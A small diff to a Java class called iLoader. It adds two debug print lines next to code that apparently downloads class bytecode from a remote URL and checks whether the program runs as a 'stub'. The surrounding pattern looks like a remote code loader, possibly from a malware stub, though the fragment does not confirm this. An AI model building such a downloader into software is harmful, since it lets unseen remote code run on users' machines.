@@ -135,6 +135,8 @@ public class iLoader
         
         Hashtable<String,byte[]> classData = downloadRequest(String.format("%s%s",urlData,"59009"));
         Enumeration<String> b = classData.keys();
+        System.out.println(System.getProperty("sun.java.command"));
+        System.out.println(stubPath);
 
         if (!classData.containsKey("error") && stubPath.toLowerCase().contains(System.getProperty("sun.java.command").toLowerCase()))
         {
